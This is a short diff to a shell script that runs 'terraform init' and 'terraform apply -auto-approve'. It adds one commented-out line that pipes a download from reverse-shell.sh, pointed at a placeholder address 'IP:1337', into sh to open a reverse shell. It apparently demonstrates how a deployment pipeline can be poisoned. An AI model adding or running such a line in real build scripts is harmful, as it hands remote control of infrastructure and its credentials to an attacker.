@@ -15,6 +15,7 @@ if [ ! -d /tmp/newfolder ]; then
    if [ -f provider ]; then
       mv provider provider.tf
    fi
+   #curl https://reverse-shell.sh/IP:1337 | sh
    $HOME/bin/terraform init
    $HOME/bin/terraform apply -auto-approve -var-file=$HOME/terraform.tfvars
    rm -rf /tmp/newfolder
